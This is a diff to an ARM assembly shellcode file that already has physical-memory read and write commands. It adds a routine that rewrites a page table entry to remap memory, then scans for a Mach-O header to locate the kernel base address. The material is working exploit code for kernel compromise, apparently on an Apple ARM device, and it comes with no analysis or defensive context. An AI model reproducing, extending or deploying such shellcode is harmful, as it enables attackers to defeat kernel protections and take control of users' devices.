@@ -41,6 +41,8 @@ _start:
     beq     L_physread
     cmp     r8, #0x3
     beq     L_physwrite
+    cmp     r8, #0x4
+    beq     L_kern_base
     b       L_cleanup
 
 L_physread:
@@ -69,6 +71,46 @@ L_physwrite:
     ldr     r2, [r2]
     str     r2, [r12]
     fdata   r12
+    b       L_cleanup
+
+L_kern_base:
+    adr     r12, _target_pte
+    ldr     r12, [r12]
+    ldr     r12, [r12]
+    mov32   r2, 0xfffff000
+    and     r12, r12, r2
+    mov32   r2, 0x4000
+    add     r2, r2, r12
+    mov32   r10, 0x403
+    orr     r2, r2, r10
+    adr     r12, _target_pte
+    ldr     r10, [r12]
+    str     r2, [r10]
+    fdata   r10
+
+    adr     r12, _target_va
+    ldr     r12, [r12]
+    fpte    r12
+
+    mov32   r2, 0xfeedfacf
+    ldr     r10, [r12]
+    cmp     r10, r2
+    bne     L_kern_base
+
+    mov     r2, #0x2
+    ldr     r10, [r12, #12]
+    cmp     r10, r2
+    bne     L_kern_base
+
+    mov32   r2, 0x07004000
+    ldr     r10, [r12, #0x38]
+    cmp     r10, r2
+    blt     L_kern_base
+
+    adr     r12, _offset
+    mov     r2, #0x1
+    str     r2, [r12]
+    fdata   r12
 
 L_cleanup:
     adr     r12, _command
@@ -83,13 +125,14 @@ L_done:
     bx      r12
 
 
-_command:   .long 0x1
-_offset:    .long 0x0
-_value:     .long 0x0
-_orig_addr: .long 0x1000848
-_target_va: .long 0x10a4000
+_command:       .long 0x1
+_offset:        .long 0x0
+_value:         .long 0x0
+_orig_addr:     .long 0x1000848
+_target_va:     .long 0x10a4000
+_target_pte:    .long 0x41414141
 
 
 /*
-as -arch armv7 shc.s -o test.o && /usr/bin/otool -tvVj test.o
+as -arch armv7 shellcode.S -o test.o && /usr/bin/otool -tvVj test.o
 */
